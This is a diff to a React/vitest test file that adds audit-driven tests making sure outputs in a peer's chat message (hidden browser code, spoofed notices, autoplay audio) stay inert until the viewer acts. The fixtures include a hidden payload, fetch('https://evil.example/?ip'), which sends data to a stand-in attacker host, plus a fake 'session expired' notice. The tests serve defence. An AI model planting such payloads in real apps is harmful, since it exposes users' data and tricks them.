@@ -7,7 +7,8 @@
 import { describe, it, expect, afterEach, vi } from "vitest";
 import { render, cleanup, fireEvent, waitFor, act } from "@testing-library/react";
 import { applyMask, maskPlaceholder, checkFnOutput, checkFormValues, outputsToMarkdown, sanitizeFnOutputs, shareableOutputs, type FnOutput } from "../client/src/lib/fn-outputs";
-import { FnHostContext, FnOutputs, groupOutputs, type FnHost } from "../client/src/components/fn/FnOutputs";
+import { FnHostContext, FnOutputs, groupOutputs, PEER_JS_EVENTS, type FnHost } from "../client/src/components/fn/FnOutputs";
+import { MessageBubble } from "../client/src/components/MessageBubble";
 import { validatePayload } from "../client/src/lib/validate";
 import { SANDBOX_CSP, SANDBOX_HTML } from "../server/functions/sandbox-page";
 
@@ -167,5 +168,94 @@ describe("the sandbox page", () => {
     expect(SANDBOX_CSP).toMatch(/default-src 'none'/);
     expect(SANDBOX_HTML).toContain("e.source !== parentWin");
     expect(SANDBOX_HTML).toContain('new Function("m5", "args"');
+  });
+});
+
+// 6.7 (audit V2): a room member wrote "outputs" into a message of their own —
+// the audit's payload: hidden browser code that phones home, a notice that looks
+// like the app's, autoplaying sound, a panel. Nothing of it may act by itself.
+describe("outputs in another member's message (6.7, V2)", () => {
+  const mallory = { name: "Mallory" };
+  const showPeer = (outputs: FnOutput[], h: FnHost, m: Record<string, unknown> | undefined = meta) =>
+    render(<FnHostContext.Provider value={h}><FnOutputs outputs={outputs} meta={m as never} fresh from={mallory} /></FnHostContext.Provider>);
+  const setActivation = (isActive: boolean | null) => {
+    if (isActive === null) { delete (navigator as unknown as { userActivation?: unknown }).userActivation; return; }
+    Object.defineProperty(navigator, "userActivation", { configurable: true, get: () => ({ isActive, hasBeenActive: isActive }) });
+  };
+  afterEach(() => setActivation(null));
+
+  it("a peer's payload survives validation — so the renderer is what keeps it inert", () => {
+    const p = validatePayload({ id: "m9", senderId: "p-mal", senderName: "Mallory", text: "hi", flags: { fn: { keyword: "help", name: "Help", chain: "chn_abcdef", outputs: [{ type: "js", code: "fetch('https://evil.example/?ip')", hidden: true }, { type: "flash", text: "Your session expired", level: "error" }] } } }, { transportSender: "p-mal", myId: "me" });
+    expect((p as { flags: { fn: { outputs: unknown[] } } }).flags.fn.outputs).toHaveLength(2);
+  });
+
+  it("hidden browser code from a peer never runs, even in a new message", () => {
+    const r = showPeer([{ type: "js", code: "fetch('https://evil.example/?ip')", hidden: true }], host());
+    expect(r.container.querySelector("iframe")).toBeNull();
+    expect(r.getByTestId("fn-peer-hidden").textContent).toMatch(/Mallory/);
+  });
+
+  it("visible browser code waits for the viewer's click, naming the sender", () => {
+    const r = showPeer([{ type: "js", code: "m5.send('x')", title: "Game" }], host());
+    expect(r.container.querySelector("iframe")).toBeNull();
+    expect(r.getByTestId("fn-peer-code").textContent).toMatch(/Run browser code from Mallory\?/);
+    fireEvent.click(r.getByTestId("fn-peer-run"));
+    const frame = r.container.querySelector("iframe")!;
+    expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
+    expect(r.getByTestId("fn-peer-started").textContent).toMatch(/Browser code from Mallory/);
+  });
+
+  it("notices, panels and sounds of a peer wait for the viewer — none fires by itself", () => {
+    const h = host();
+    const play = vi.spyOn(HTMLMediaElement.prototype, "play").mockResolvedValue(undefined);
+    const r = showPeer([{ type: "flash", text: "Your session expired", level: "error" }, { type: "window", id: "files", args: null }, { type: "audio", mime: "audio/wav", data: "UklGRg==", autoplay: true, loop: true }], h);
+    expect(h.flash).not.toHaveBeenCalled();
+    expect(h.openWindow).not.toHaveBeenCalled();
+    expect(play).not.toHaveBeenCalled();
+    expect(r.getByText("Your session expired")).toBeTruthy(); // shown in the bubble, as the member's text
+    play.mockRestore();
+  });
+
+  it("once started, its code reaches the model only while the viewer is active, and only so often; its notices carry the sender", async () => {
+    const h = host();
+    const r = showPeer([{ type: "js", code: "for(;;) m5.send('x')" }], h);
+    fireEvent.click(r.getByTestId("fn-peer-run"));
+    const frame = r.container.querySelector("iframe")!;
+    const send = () => window.dispatchEvent(new MessageEvent("message", { data: { m5: true, kind: "send", name: "x", data: null }, source: frame.contentWindow }));
+    setActivation(false);
+    await act(async () => { send(); });
+    expect(h.event).not.toHaveBeenCalled(); // nobody is using it: not in the viewer's name
+    setActivation(true);
+    await act(async () => { for (let i = 0; i < PEER_JS_EVENTS + 10; i++) send(); });
+    expect(h.event).toHaveBeenCalledTimes(PEER_JS_EVENTS);
+    await act(async () => { window.dispatchEvent(new MessageEvent("message", { data: { m5: true, kind: "flash", text: "Saved", level: "success" }, source: frame.contentWindow })); });
+    expect(h.flash).toHaveBeenCalledWith("Mallory: Saved", "success");
+  });
+
+  it("a peer's broken output is logged, but the error entry point does not run in the viewer's name", async () => {
+    const h = host();
+    showPeer([{ type: "image", mime: "image/png", data: "AAAA" }], h);
+    const img = document.querySelector("img.fn-image")!;
+    fireEvent.error(img);
+    await waitFor(() => expect(h.report).toHaveBeenCalledWith(meta, expect.objectContaining({ type: "error", fromError: true })));
+  });
+
+  it("the bubble: outputs in my own message act, the same outputs in a member's message wait", () => {
+    const flags = { fn: { keyword: "demo", name: "Demo", chain: "chn_abc123def", outputs: [{ type: "js" as const, code: "x()" }] } };
+    const bubble = (mine: boolean, senderId: string) => render(
+      <MessageBubble id={`b-${senderId}`} senderId={senderId} senderName={mine ? "Me" : "Mallory"} mine={mine} isSystem={false} secure createdAt={Date.now()} timeLabel=""
+        text="(browser code)" flags={flags} onVanish={() => undefined} lang="en" renderText={(t) => <span>{t}</span>} formatSize={(n) => `${n} B`} badge={null} />,
+    );
+    const theirs = bubble(false, "p-mal");
+    expect(theirs.container.querySelector("iframe")).toBeNull();
+    expect(theirs.getByTestId("fn-peer-code")).toBeTruthy();
+    cleanup();
+    expect(bubble(true, "p-me").container.querySelector("iframe")).not.toBeNull();
+    cleanup();
+    expect(bubble(false, "function:demo").container.querySelector("iframe")).not.toBeNull(); // a caller-only answer, made here
+  });
+
+  it("a peer cannot take an id reserved for this app's own answers", () => {
+    expect(validatePayload({ id: "m1", senderId: "function:demo", senderName: "Demo", text: "x" }, { transportSender: "function:demo", myId: "me" })).toBeNull();
   });
 });
